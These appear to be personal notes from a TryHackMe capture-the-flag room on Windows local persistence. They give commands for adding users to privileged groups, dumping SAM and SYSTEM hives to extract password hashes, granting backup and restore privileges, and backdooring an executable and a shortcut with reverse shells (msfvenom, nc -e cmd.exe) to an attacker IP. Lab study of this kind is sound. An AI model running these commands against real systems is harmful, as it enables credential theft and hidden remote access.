-reasons for local persistence
1. re-exploitation isn't always possible
2. getting a foothold is hard to reproduce
3. security is one step behind

---------------------------------------------------------------------------------------------

Assign Group Membership
-make unprivileged user gain admin privileges
net localgroup administrators thmuser0 /add

-avoid being suspicious - use backup operators group
-won't have admin privileges but have read/write access to anyfile or registry key on the system
-can escalate to admin account trivially
net localgroup "Backup Operators" thmuser1 /add

-add to RDP or winRM
net localgroup "Remote Mangement Users" thmuser1 /add

-connect using evil-winrm
evil-winrm -i [IP] -u thmuser1 -p Password321
whoami /groups

-LocalAccountTokenFilterPolicy implemented by User Account Control (UAC) - strips admin privileges when logging in remotely
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

*stay in directory: C:\Users\thmuser1\Documents

(on evil-winrm)
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download system.bak
download sam.bak

-attacker machine
(apt install python3-impacket)
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
-get hashes
-log into administator using hashes
evil-winrm -i [IP] -u Administrator
THM{FLAG_BACKED_UP!}

Special Privileges and Security Descriptors
-SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
-SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.
-admin terminal
secedit /export /cfg config.inf
-go to file same directory
-add thmuser2 to SeBackupPrivilege and SeRestorePrivilege
-save file
-convert .inf file to .sdb file to load configuration back into the system
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cfg config.inf
-add thmuser2 to remote mangement users group
-powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
-add thmuser2 and give full control permissions
-log in using evil-winrm
evil-winrm -i [IP] -u thmuser2 -p Password321
cd C:\flags
.\flag2.exe
*THM{IM_JUST_A_NORMAL_USER}

RID Hijacking


----------------------------------------------------------------------------------------------------------------------------------------------------

Backdooring files

Executabel files
-tampering with files user interacts with regularly
-files must keep working as expected
-eg executable file on the desktop
-use msfvenom to generate an executable
-eg. shortcut to PuTTY points to C:\Program Files\PuTTY\putty.exe
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe

Shortcut files
-make shortcut point to a scritps that will run the backdoor and then execute the usual program
-create powershell script
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe [Attacker IP] [Port]"
C:\Windows\System32\calc.exe
-save file as backdoor.ps1 in windows\system32
-right click on calc and got to shortcut
-in the target add
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
-start an nc listener on attacker machine
nc -lvp port
-run calc
-get flag5
*THM{NO_SHORTCUTS_IN_LIFE}



